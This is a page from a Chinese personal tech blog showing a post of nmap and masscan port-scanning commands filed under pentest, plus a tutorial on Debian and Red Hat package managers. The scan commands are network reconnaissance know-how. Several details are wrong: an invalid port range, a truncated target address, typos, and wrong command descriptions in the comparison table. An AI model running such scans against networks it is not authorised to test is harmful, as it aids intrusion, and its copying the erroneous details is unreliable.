<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"allofmortal.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://allofmortal.github.io/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale">
<meta property="article:author" content="Mortal">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://allofmortal.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="تشغيل شريط التصفح">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>معلومات</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>الوسوم<span class="badge">20</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>التصنيفات<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>الأرشيفات<span class="badge">28</span></a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/yourname" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2022/11/02/nmap-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/02/nmap-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">nmap 常用命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2022-11-02 10:37:35 / عُدل: 18:53:41" itemprop="dateCreated datePublished" datetime="2022-11-02T10:37:35+08:00">2022-11-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="nmap-常用命令"><a href="#nmap-常用命令" class="headerlink" title="nmap 常用命令"></a>nmap 常用命令</h1><h2 id="必要命令"><a href="#必要命令" class="headerlink" title="必要命令"></a>必要命令</h2><p><code>-iL</code> xx.txt</p>
<p><code>-sV</code>           # 服务版本</p>
<p><code>-p</code>            # 端口</p>
<p><code>-A -Pn 0-65536</code>                   # -A 全扫描 -Pn 直接发包<br>               -iL  xxx.txt</p>
<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p><code>-sP</code>      # 探测此网段的存活主机 可以连同 | grep nmap 一起使用 这样看起来更清爽一些</p>
<p><code>-p 80</code>    # 检测特定端口</p>
<p><code>-sT</code>      # 检测TCP端口</p>
<p><code>-sU</code>      # 检测UDP端口</p>
<p><code>-sV</code>      # 探测端口的服务和版本</p>
<p><code>-O</code>       # 探测操作系统的类型和版本</p>
<p><code>-Pn</code>      # 直接进行深度测试，不检测主机存活</p>
<h4 id="组合技"><a href="#组合技" class="headerlink" title="组合技"></a>组合技</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan -p 1-65535 192.168.0.0/24 --rate=2000 &gt;&gt;ports.txt</span><br><span class="line">cat ports.txt |awk &#x27;&#123;print($6&quot;:&quot;$4)&#125;&#x27;|sed &#x27;s#/tcp##g&#x27; &gt;&gt;portclean.txt</span><br><span class="line">nmap -sV -p 35386 192.168.0.</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2022/04/24/Drbian%E5%92%8Credhat%E4%BD%93%E7%B3%BB%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/24/Drbian%E5%92%8Credhat%E4%BD%93%E7%B3%BB%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">Debian和redhat体系的软件安装</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2022-04-24 20:07:09" itemprop="dateCreated datePublished" datetime="2022-04-24T20:07:09+08:00">2022-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:49:19" itemprop="dateModified" datetime="2024-04-28T09:49:19+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">系统</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%B3%BB%E7%BB%9F/%E5%91%BD%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">命令</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Drbian和redhat体系的软件安装"><a href="#Drbian和redhat体系的软件安装" class="headerlink" title="Drbian和redhat体系的软件安装"></a>Drbian和redhat体系的软件安装</h1><h2 id="1-Debian体系的软件安装"><a href="#1-Debian体系的软件安装" class="headerlink" title="1. Debian体系的软件安装"></a>1. Debian体系的软件安装</h2><p>在前文中，我们了解到linux系统的发行版主要分为debian和redhat两个体系。</p>
<p>两个体系最直观的不同是软件安装命令的不同。我们来学习debian体系的软件安装。</p>
<p>前文我们使用的Kali系统，就以本节所介绍的命令来管理软件的安装与卸载。</p>
<h3 id="1-1-dpkg-命令"><a href="#1-1-dpkg-命令" class="headerlink" title="1.1 dpkg 命令"></a>1.1 dpkg 命令</h3><p><code>dpkg</code> 是为”Debian”操作系统专门开发的套件管理系统，用于软件的安装，更新和移除。能被<code>dpkg</code>命令安装的软件包一般以<code>.deb</code>为文件后缀。</p>
<p><code>dpkg</code> 是为”Debian”操作系统专门开发的套件管理系统，用于软件的安装，更新和移除。能被<code>dpkg</code>命令安装的软件包一般以<code>.deb</code>为文件后缀。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`dpkg -i     # 安装软件包</span><br><span class="line">dpkg -r     # 移除软件（保留配置）</span><br><span class="line">dpkg -P     # 移除软件（不保留配置）</span><br><span class="line">dpkg -c     # 列出deb包的内容</span><br><span class="line">dpkg -l     # 配合|grep，查找主机包</span><br><span class="line">dpkg -s     # 查找包的详细信息</span><br><span class="line">dpkg -L     # 查看已安装的软件包，都存在系统哪有文件</span><br><span class="line">dpkg -S     # 显示指定包的状态信息`</span><br></pre></td></tr></table></figure>
<h3 id="1-2-1-apt-命令"><a href="#1-2-1-apt-命令" class="headerlink" title="1.2.1. apt 命令"></a>1.2.1. apt 命令</h3><hr>
<p><code>apt</code>是一个在Debian中的Shell前端软件包管理器。</p>
<p><code>apt</code>命令提供了查找、安装、升级、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。</p>
<p><code>apt</code>命令执行需要超级管理员权限(root)</p>
<h3 id="1-2-2-源的配置"><a href="#1-2-2-源的配置" class="headerlink" title="1.2.2. 源的配置"></a>1.2.2. 源的配置</h3><p><code>apt</code>命令更新和安装软件包是从软件安装源中请求的。</p>
<p>kali系统的源文件在<code>/etc/apt/sources.list</code>。</p>
<p>常见kali源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">东软大学源</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">新加坡kali源</span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">163 Kali源</span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br></pre></td></tr></table></figure>
<p>可以编辑<code>/etc/apt/sources.list</code>文件，将源切换成需要的源。</p>
<p>修改之后，需要通过<code>apt update</code>命令来更新源。</p>
<h3 id="1-3-apt-命令"><a href="#1-3-apt-命令" class="headerlink" title="1.3. apt 命令"></a>1.3. apt 命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apt-get install      #安装软件包                </span><br><span class="line">apt-get remove       #仅卸载软件，但是并不卸载配置文件</span><br><span class="line">apt-get purge        #卸载指令，同时卸载相应的配置文件</span><br><span class="line">apt-get update       #将所有包的来源更新（更新源）</span><br><span class="line">apt-get upgrade      #将系统中旧版本的包升级成最新的</span><br><span class="line">apt-cache search     #用关键字搜索包</span><br><span class="line">apt-cache show       #显示特定包的基本信息</span><br><span class="line">apt-cache depends    #列出包的依赖</span><br><span class="line">apt-get clean        #清理本地包占用的磁盘空间(/var/cache/apt/archives)</span><br><span class="line">apt-get autoremove   #卸载软件的时候同时卸载那些当初作为依赖但是现在并不需要的包</span><br></pre></td></tr></table></figure>
<h3 id="2-redhat体系的软件安装"><a href="#2-redhat体系的软件安装" class="headerlink" title="2. redhat体系的软件安装"></a>2. redhat体系的软件安装</h3><p>在前文中，我们了解到linux系统的发行版主要分为debian和redhat两个体系。两个体系最直观的不同是软件安装命令的不同。</p>
<p>这一节，我们要来学习rehad体系的软件安装。前文我们使用的Centos实验环境，就以本节所介绍的命令来管理软件的安装与卸载。</p>
<h2 id="1-rpm-命令"><a href="#1-rpm-命令" class="headerlink" title="1. rpm 命令"></a>1. rpm 命令</h2><p><code>rpm</code>命令用于管理软件。rpm原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序，由于它遵循 GPL 规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM 套件管理方式的出现，让 Linux 易于安装，升级，间接提升了 Linux 的适用度。能被<code>rpm</code>命令安装的软件包一般以<code>.rpm</code>为文件后缀。</p>
<h3 id="2-1-常见命令"><a href="#2-1-常见命令" class="headerlink" title="2.1 常见命令"></a>2.1 常见命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh [package_name]         #安装软件包</span><br><span class="line">rpm -evh [package_name]         #卸载软件</span><br><span class="line">rpm -qlp *.rpm                  #列出rpm包的内容</span><br><span class="line">rpm -qa |grep [字符串]           #在已安装的所有软件中查询包含某字符串的软件版本</span><br><span class="line">rpm -ql [软件名]                 #列出该软件所有文件与目录所在的完整文件名</span><br><span class="line">rpm -qc [软件名]                 #列出软件的所有设置文件</span><br><span class="line">rpm -qR [软件名]                 #查询某软件依赖的其他软件</span><br><span class="line">rpm -qf [文件名]                 #查询文件属于哪个软件包</span><br></pre></td></tr></table></figure>
<h3 id="2-2-yum-命令"><a href="#2-2-yum-命令" class="headerlink" title="2.2. yum 命令"></a>2.2. yum 命令</h3><hr>
<p><code>yum</code>命令是一个在 Fedora 和 RedHat 以及 SUSE 中的 Shell 前端软件包管理器。</p>
<p>基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令。</p>
<h3 id="2-3-yum-源配置"><a href="#2-3-yum-源配置" class="headerlink" title="2.3 yum 源配置"></a>2.3 yum 源配置</h3><p>同apt命令一样，<code>yum</code>依然从源获取软件。在centos中yum源文件存储在<code>/etc/yum.repos.d</code>目录中。</p>
<p><img src="../../../bookimages/image-20220422100609634.png" alt=""><br><img src="../../../bookimages/image-20220422100609634.png" alt=""></p>
<p>repo文件的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[baseos]</span><br><span class="line">name=Rocky Linux $releasever - BaseOS</span><br><span class="line">mirrorlist=https://mirrors.rockylinux.org/mirrorlist?arch=$basearch&amp;repo=BaseOS-$releasever</span><br><span class="line">#baseurl=http://dl.rockylinux.org/$contentdir/$releasever/BaseOS/$basearch/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-rockyofficial</span><br></pre></td></tr></table></figure>
<p>epel源是redhat系比较常用的源。</p>
<p>EPEL (Extra Packages for Enterprise Linux)是基于Fedora的一个项目，为“红帽系”的操作系统提供额外的软件包，适用于RHEL、CentOS和Scientific Linux.</p>
<p>安装epel源只需要安装一个叫”epel-release”的软件包，这个软件包会自动配置yum的软件仓库。</p>
<p>命令为：<code>dnf install -y epel-release</code></p>
<h3 id="2-2-yum-命令-1"><a href="#2-2-yum-命令-1" class="headerlink" title="2.2 yum 命令"></a>2.2 yum 命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum makecache                         #更新源（安装新源后执行）</span><br><span class="line">yum clean all                         #清除缓存目录（/var/cache/yum）下的软件包及旧的headers</span><br><span class="line">yum list |grep                        #显示所有已经安装和可以安装的程序包</span><br><span class="line">yum info [package-name]               #显示安装包信息</span><br><span class="line">yum -y install [package-name]         #安装软件,默认选yes</span><br><span class="line">yum remove [package-name]             #卸载</span><br><span class="line">yum deplist rpm                       #查看程序rpm依赖情况</span><br><span class="line">yum update                            #更新全部软件包</span><br><span class="line">yum group list                        #列出组</span><br><span class="line">yum group install &quot;Security Tools&quot;    #安装‘Security Tools’软件组</span><br><span class="line">yum search                            #检索安装包</span><br></pre></td></tr></table></figure>
<h3 id="2-3-dnf-命令"><a href="#2-3-dnf-命令" class="headerlink" title="2.3 dnf 命令"></a>2.3 dnf 命令</h3><p><code>DNF</code>是新一代的rpm软件包管理器。它正在逐步取代<code>yum</code>命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">dnf repolist                                           #该命令用于显示系统中可用的 DNF 软件库</span><br><span class="line">dnf repolist all                                       #该命令用于显示系统中可用和不可用的所有的 DNF 软件库</span><br><span class="line">dnf list                                               #用户系统上的所有来自软件库的可用软件包和所有已经安装在系统上的软件包</span><br><span class="line">dnf list installed                                     #该命令用于列出所有安装了的 RPM 包</span><br><span class="line">dnf list available                                     #用于列出来自所有可用软件库的可供安装的软件包</span><br><span class="line">dnf search [pakage]                                    #用该命令来搜索软件包</span><br><span class="line">dnf provides /bin/bash                                 #查找某一文件的提供者</span><br><span class="line">dnf info nano                                          #查看软件包详情</span><br><span class="line">dnf install [pakage]                                   #安装软件包</span><br><span class="line">dnf update systemd                                     #该命令用于升级指定软件包</span><br><span class="line">dnf check-update                                       #该命令用于检查系统中所有软件包的更新</span><br><span class="line">dnf update                                             #该命令用于升级系统中所有有可用升级的软件包</span><br><span class="line">dnf remove [pakage]                                    #删除系统中指定的软件包</span><br><span class="line">dnf autoremove                                         #删除无用孤立的软件包</span><br><span class="line">dnf clean all                                          #删除缓存的无用软件包</span><br><span class="line">dnf history                                            #查看您系统上 DNF 命令的执行历史</span><br><span class="line">dnf grouplist                                          #该命令用于列出所有的软件包组</span><br><span class="line">dnf groupinstall ‘Educational Software’                #该命令用于安装一个软件包组</span><br><span class="line">dnf groupupdate ‘Educational Software’                 #升级一个软件包组中的软件包</span><br><span class="line">dnf groupremove ‘Educational Software’                 #该命令用于删除一个软件包组</span><br><span class="line">dnf reinstall [pakage]                                 #该命令用于重新安装特定软件包</span><br></pre></td></tr></table></figure>
<h2 id="3-Debian-与-redhat-命令的异同"><a href="#3-Debian-与-redhat-命令的异同" class="headerlink" title="3. Debian 与 redhat 命令的异同"></a>3. Debian 与 redhat 命令的异同</h2><p><table></p>
<p><th>功能</th> <th>debian</th> <th colspan="2">redhat</th><br>    <tr></p>
<p><td>单机</td> <td>dpkg</td> <td colspan="2">rmp</td><br>    &lt;/tr&gt;<br>    <tr></p>
<p><td>安装</td> <td>dpkg -i</td> <td colspan="2">rpm -ivh [package_name]</td><br>&lt;/tr&gt;<br>    <tr></p>
<p><td rowspan="2">卸载</td> <td>dpkg -r (保留配置)</td> <td colspan="2"rowspan="2">rpm -evh [package_name]</td><br>&lt;/tr&gt;<br>    <tr>
        <td>dpkg -P (不保留配置)</td> <td colspan="2"></td>
    </tr><br>    <tr>
        <td>查看对应包文件</td> <td>dpkg -s</td> <td colspan="2">rpm -qf [文件名]</td>
    </tr><br>    <tr>
        <td>显示指定包的状态信息</td> </td> <td>dekp -L</td> <td colspan="2">rpm -ql [软件名]</td>
    </tr></p>
<tr>
<td>&nbsp;</td> <td>&nbsp;</td> <td colspan="2">&nbsp;</td>
</tr>
<tr>
<td>网络同步</td> <td>apt-get</td> <td>dnf</td> <td>yum</td>
</tr>
<tr>
<td>更新源</td> <td>apt-get update</td> <td>dnf list</td> <td>yum makecache</td>
</tr>
<tr>
<td>安装软件包</td> <td>apt-get install</td> <td>dnf install [pakage]</td> <td>yum -y install [package-name]</td>
</tr>
<tr>
    <td rowspan="3">卸载</td> <td>apt-get remove</br>仅卸载软件，但是并不卸载配置文件</td> <td>dnf remove [pakage]</br>#删除系统中指定的软件包</td> <td>yum remove [package-name]</br>#删除无用孤立的软件包</td>
</tr>
<tr>
    <td rowspan="2">apt-get purge</br>卸载指令，同时卸载相应的配置文件</td>  <td>dnf autoremove</br>#删除缓存的无用软件包</td> <td></td>
</tr>
<tr>
<td >dnf clean all</td> <td></td>
</tr>
<tr>
<td>配置文件</td> <td></td> <td>dnf info nano</td> <td>yum info [package-name]</td> 
</tr>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2022/04/21/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/21/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">Linux基础命令</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2022-04-21 21:56:18" itemprop="dateCreated datePublished" datetime="2022-04-21T21:56:18+08:00">2022-04-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:42:27" itemprop="dateModified" datetime="2024-04-28T09:42:27+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">系统</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%B3%BB%E7%BB%9F/%E5%91%BD%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">命令</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
